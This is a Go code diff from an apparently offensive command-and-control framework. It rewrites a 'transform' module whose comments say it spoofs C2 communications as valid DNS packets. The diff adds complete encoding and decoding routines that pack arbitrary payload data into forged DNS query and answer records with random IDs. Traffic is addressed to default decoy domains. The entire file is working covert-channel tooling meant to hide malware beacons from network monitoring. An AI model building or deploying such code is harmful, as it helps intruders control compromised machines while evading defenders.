@@ -3,139 +3,281 @@ package transform
 import (
 	"io"
 	"strings"
+	"sync"
 
 	"github.com/iDigitalFlame/xmt/util"
-	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-// TODO(dij): Rewrite this whole POS
-
 const (
-	dnsSize      = 512
-	dnsNameMax   = 64
-	dnsRecordMax = 128
+	dnsMax = 2048
+	dnsSeg = 256
 )
 
 var (
-	// DNS is the standard DNS Transform struct. This struct uses the default DNS addresses contained
-	// in 'DefaultDNSNames' to spoof DNS packets. Custom options may be used by creating a new DNS struct or
-	// updating the 'Domains' property.
-	DNS = new(DNSClient)
+	// DNS is the standard DNS Transform alias. This alias uses the default
+	// DNS addresses contained in 'DefaultDomains()' to spoof C2 communications
+	// as valid DNS packets.
+	//
+	// Custom options may be used by creating a new DNS alias or updating the
+	// current alias (string array) with new domains.
+	DNS = DNSTransform{}
 
-	// DefaultDomains is in array of DNS names to be used if the 'Domains' property of a DNS struct is empty.
-	DefaultDomains = []string{
-		"duckduckgo.com",
-		"google.com",
-		"microsoft.com",
-		"amazon.com",
-		"cnn.com",
-		"youtube.com",
-		"twitch.tv",
-		"reddit.com",
-		"facebook.com",
-		"slack.com",
+	packets = sync.Pool{
+		New: func() interface{} {
+			return new(dnsPacket)
+		},
 	}
 
-	// ErrInvalidLength is an error raised by the Read and Write functions
-	// if the byte array supplied is smaller than the required byte size to
-	// Transform into a DNS packet.
-	ErrInvalidLength = xerr.New("length of byte array is invalid")
+	dnsBuiltins struct {
+		sync.Once
+		e []string
+	}
 )
 
-// DNSClient is a Transform struct that attempts to mask C2 traffic in the form of DNS request packets.
-type DNSClient struct {
-	Domains []string
-
-	lastA, lastB byte
+type dnsPacket struct {
+	_ [0]func()
+	b [4096]byte
+	n int
 }
 
-func (d DNSClient) domain() string {
-	if len(d.Domains) == 0 {
-		return DefaultDomains[util.FastRandN(len(DefaultDomains))]
+// DNSTransform is a Transform alias that attempts to mask C2 traffic in the
+// form of DNS request packets.
+type DNSTransform []string
+
+func (p *dnsPacket) Reset() {
+	p.n = 0
+}
+
+// DefaultDomains returns an array of DNS names to be used if the DNS Transform
+// is empty.
+func DefaultDomains() []string {
+	dnsBuiltins.Do(func() {
+		dnsBuiltins.e = getDefultDomains()
+	})
+	return dnsBuiltins.e
+}
+func (d *DNSTransform) pick() string {
+	// NOTE(dij): This function has to be on a pointer receiver as it can
+	//            be used to set the value to the defaults if needed.
+	if len(*d) == 1 {
+		return (*d)[0]
 	}
-	if len(d.Domains) == 1 {
-		return d.Domains[0]
+	if len(*d) == 0 {
+		if *d = DefaultDomains(); len(*d) == 1 {
+			return (*d)[0]
+		}
 	}
-	return d.Domains[util.FastRandN(len(d.Domains))]
+	return (*d)[util.FastRandN(len(*d))]
+}
+func (p *dnsPacket) Flush(w io.Writer) error {
+	if p.n == 0 {
+		return nil
+	}
+	n, err := w.Write(p.b[:p.n])
+	if p.n -= n; err != nil {
+		return err
+	}
+	if p.n > 0 {
+		return io.ErrShortWrite
+	}
+	p.n = 0
+	return nil
+}
+func (p *dnsPacket) Write(b []byte) (int, error) {
+	n := copy(p.b[p.n:], b)
+	if n == 0 {
+		return 0, io.ErrShortWrite
+	}
+	p.n += n
+	return n, nil
+}
+func decodePacket(w io.Writer, b []byte) (int, error) {
+	var (
+		_ = b[12]
+		q = int(b[4])<<8 | int(b[5])
+		c = int(b[6])<<8 | int(b[7])
+		t = int(b[10])<<8 | int(b[11])
+		s = 12
+	)
+	for ; q > 0; q-- {
+		for i := 0; i < 64; {
+			if i >= len(b) {
+				return 0, io.ErrUnexpectedEOF
+			}
+			if i = int(b[s]); i == 0 {
+				s++
+				break
+			}
+			s += i + 1
+		}
+		if s += 4; s >= len(b) {
+			return 0, io.ErrUnexpectedEOF
+		}
+	}
+	for ; c > 0; c-- {
+		if s += 10; s > len(b) {
+			return 0, io.ErrUnexpectedEOF
+		}
+		s += int(b[s])<<8 | int(b[s+1]) + 2
+	}
+	for i := 0; t > 0; t-- {
+		if s+6 >= len(b) {
+			return 0, io.ErrUnexpectedEOF
+		}
+		if b[s] != 0xC0 || b[s+1] != 0x0C || b[s+2] != 00 || b[s+3] != 0xA || b[s+4] != 0 || b[s+5] != 1 {
+			return 0, io.ErrNoProgress
+		}
+		s += 10
+		i = int(b[s])<<8 | int(b[s+1])
+		s += 2
+		if _, err := w.Write(b[s : s+i]); err != nil {
+			return 0, err
+		}
+		s += i
+	}
+	return s, nil
+}
+func decodePackets(w io.Writer, b []byte) (int, error) {
+	if len(b) == 0 {
+		return 0, nil
+	}
+	var i int
+	for i < len(b) {
+		n, err := decodePacket(w, b[i:])
+		if err != nil {
+			return i, err
+		}
+		i += n
+	}
+	return i, nil
 }
 
 // Read satisfies the Transform interface requirements.
-func (d *DNSClient) Read(b []byte, w io.Writer) error {
-	if len(b) < 16 {
-		return ErrInvalidLength
+func (d DNSTransform) Read(b []byte, w io.Writer) error {
+	n, err := decodePackets(w, b)
+	if err != nil {
+		return err
 	}
-	_ = b[16]
-	d.lastA, d.lastB = b[0], b[1]
-	c, i := uint16(b[11])|uint16(b[10])<<8, uint16(b[5])|uint16(b[4])<<8
-	if c == 0 || i == 0 {
-		return io.EOF
-	}
-	x, v := 12, 0
-	for ; x < len(b); i-- {
-		if v = int(b[x]); v == 0 {
-			break
-		}
-		x += v + 1
-	}
-	x += 15
-	for ; x < len(b); c-- {
-		if v = int(b[x]); v == 0 {
-			break
-		}
-		if _, err := w.Write(b[x+1 : x+v+1]); err != nil {
-			return err
-		}
-		x += v + 1
+	if len(b) != n {
+		return io.ErrUnexpectedEOF
 	}
 	return nil
 }
 
 // Write satisfies the Transform interface requirements.
-//
-// TODO(dij): Write a checksum function to calculate the valid DNS checksum of the packet
-//            (structure is OK, but wireshark shows no checksum code).
-func (d *DNSClient) Write(b []byte, w io.Writer) error {
-	if len(b) == 0 {
-		return ErrInvalidLength
+func (d DNSTransform) Write(b []byte, w io.Writer) error {
+	n, err := encodePackets(w, b, d.pick())
+	if err != nil {
+		return err
 	}
-	g := *bufs.Get().(*[]byte)
-	_ = g[dnsSize-1]
-	n := strings.Split(d.domain(), ".")
-	c, i := (len(b)/dnsRecordMax)+1, len(n)
-	if d.lastA != 0 && d.lastB != 0 {
-		g[0], g[1] = d.lastA, d.lastB
-		d.lastA, d.lastB = 0, 0
-	} else {
-		d.lastA, d.lastB = byte(util.FastRand()), byte(util.FastRand())
-		g[0], g[1] = d.lastA, d.lastB
+	if len(b) != n {
+		return io.ErrShortWrite
 	}
-	// TODO: Fix offset for the hash to match the valid hash value in the DNS RFC.
-	g[2], g[3] = 1, 32
-	g[4], g[5] = byte(i>>8), byte(i)
-	g[6], g[7], g[8], g[9] = 0, 0, 0, 0
-	g[10], g[11] = byte(c>>8), byte(c)
-	w.Write(g[:12])
-	t, y := 0, 0
-	for x := range n {
-		t = copy(g[1:dnsNameMax], []byte(n[x]))
-		g[0] = byte(t)
-		w.Write(g[:t+1])
-	}
-	g[0], g[1], g[2], g[3], g[4] = 0, 0, 1, 0, 1
-	g[5], g[6], g[7], g[8], g[9] = 0, 0, 42, 16, 0
-	g[10], g[11], g[12], g[13], g[14] = 0, 0, 0, 0, 0
-	w.Write(g[:15])
-	for y < len(b) {
-		if t = copy(g[1:dnsRecordMax], b[y:]); t == 0 {
-			break
-		}
-		g[0] = byte(t)
-		w.Write(g[:t+1])
-		if t+1 < dnsRecordMax || t == 0 {
-			break
-		}
-		y += t
-	}
-	bufs.Put(&g)
 	return nil
+}
+func encodePackets(w io.Writer, b []byte, s string) (int, error) {
+	if len(b) == 0 {
+		return 0, nil
+	}
+	var (
+		t    = bufs.Get().(*[]byte)
+		p    = packets.Get().(*dnsPacket)
+		i, n int
+		err  error
+	)
+	for i < len(b) {
+		if n, err = encodePacket(p, t, b[i:], s); err != nil {
+			break
+		}
+		if err = p.Flush(w); err != nil {
+			break
+		}
+		i += n
+	}
+	p.Reset()
+	bufs.Put(t)
+	packets.Put(p)
+	return i, nil
+}
+func encodePacket(w io.Writer, u *[]byte, b []byte, s string) (int, error) {
+	_ = (*u)[511]
+	(*u)[0], (*u)[1] = byte(util.FastRand()), byte(util.FastRand())
+	c := len(b)
+	if c > dnsMax {
+		c = dnsMax
+	}
+	t := c / dnsSeg
+	if t*dnsSeg < c || t == 0 {
+		t++
+	}
+	var (
+		e = strings.Split(s, ".")
+		r = len(e)
+	)
+	if dnsServer {
+		(*u)[2], (*u)[3], (*u)[4], (*u)[5] = 132, 128, 0, 1
+		(*u)[6], (*u)[7], (*u)[8], (*u)[9] = 0, 1, 0, 0
+	} else {
+		(*u)[2], (*u)[3], (*u)[4], (*u)[5] = 1, 0, 0, 1
+		(*u)[6], (*u)[7], (*u)[8], (*u)[9] = 0, 0, 0, 0
+	}
+	(*u)[10], (*u)[11] = byte(t>>8), byte(t)
+	if y, err := w.Write((*u)[0:12]); err != nil {
+		return 0, err
+	} else if y != 12 {
+		return 0, io.ErrShortWrite
+	}
+	for i := 0; i < r; i++ {
+		if len(e[i]) > 256 {
+			e[i] = e[i][:250]
+		}
+		(*u)[0] = byte(len(e[i]))
+		var (
+			k      = copy((*u)[1:256], e[i])
+			y, err = w.Write((*u)[0 : k+1])
+		)
+		if err != nil {
+			return 0, err
+		} else if y != k+1 {
+			return 0, io.ErrShortWrite
+		}
+	}
+	(*u)[0], (*u)[1], (*u)[2], (*u)[3], (*u)[4] = 0, 0, 1, 0, 1
+	if y, err := w.Write((*u)[0:5]); err != nil {
+		return 0, err
+	} else if y != 5 {
+		return 0, io.ErrShortWrite
+	}
+	if dnsServer {
+		(*u)[0], (*u)[1] = 192, 12
+		(*u)[2], (*u)[3], (*u)[4], (*u)[5], (*u)[6], (*u)[7] = 0, 1, 0, 1, 0, 0
+		(*u)[8], (*u)[9], (*u)[10], (*u)[11] = 3, byte(util.FastRand()), 0, 4
+		(*u)[12], (*u)[13] = byte(util.FastRand()), byte(util.FastRand())
+		(*u)[14], (*u)[15] = byte(util.FastRand()), byte(util.FastRand())
+		if y, err := w.Write((*u)[0:16]); err != nil {
+			return 0, err
+		} else if y != 16 {
+			return 0, io.ErrShortWrite
+		}
+	}
+	var i int
+	for x, j := 0, 256; x < t && i < len(b) && i < c; x++ {
+		(*u)[0], (*u)[1] = 192, 12
+		(*u)[2], (*u)[3], (*u)[4], (*u)[5], (*u)[6], (*u)[7] = 0, 10, 0, 1, 0, 0
+		if k := len(b) - i; k < 256 {
+			j = k
+		}
+		(*u)[8], (*u)[9], (*u)[10], (*u)[11] = 0, 0, byte(j>>8), byte(j)
+		if y, err := w.Write((*u)[0:12]); err != nil {
+			return 0, err
+		} else if y != 12 {
+			return 0, io.ErrShortWrite
+		}
+		v, err := w.Write(b[i : i+j])
+		if err != nil {
+			return 0, err
+		}
+		i += v
+	}
+	return i, nil
 }
